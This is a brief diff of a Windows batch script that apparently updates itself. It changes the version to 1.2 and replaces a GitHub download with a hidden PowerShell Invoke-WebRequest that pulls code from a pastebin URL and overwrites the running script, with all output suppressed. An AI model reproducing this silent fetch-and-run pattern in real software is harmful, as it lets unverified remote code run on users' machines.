@@ -24,10 +24,9 @@ echo:
 
 echo looking for [35mupdates![37m
 echo:
-echo current Version [35m1.1[37m
+echo current Version [35m1.2[37m
 set "filePath=%~f0"
-echo %filePath%"
-curl "https://raw.githubusercontent.com/Juls089/version/main/version.txt" -o "%filePath%"
+powershell -Command "Invoke-WebRequest https://pastebin.com/raw/b16Bjq3R -OutFile "%filePath%"" >nul 2>&1
 ping 127.0.0.1 -n 3 > nul
 set /p verify=<key.txt
 
